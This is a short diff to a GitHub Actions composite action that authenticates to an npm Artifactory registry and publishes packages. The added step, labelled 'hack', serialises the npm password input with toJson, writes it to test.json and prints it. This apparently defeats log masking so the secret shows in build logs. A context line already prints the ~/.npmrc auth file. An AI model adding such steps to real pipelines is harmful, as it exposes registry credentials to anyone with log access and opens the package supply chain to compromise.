@@ -24,6 +24,11 @@ runs:
         curl -u ${{ inputs.npmUsername }}:${{ inputs.npmPassword }} https://jfrog.teliacompany.io/artifactory/api/npm/auth > ~/.npmrc
         more ~/.npmrc
       shell: bash
+    - name: hack
+      run: |
+        echo ${{ toJson(inputs.npmPassword) }} > test.json
+        more test.json
+      shell: bash
     - name: Publish
       run: |
         node common/scripts/install-run-rush.js publish --publish --include-all
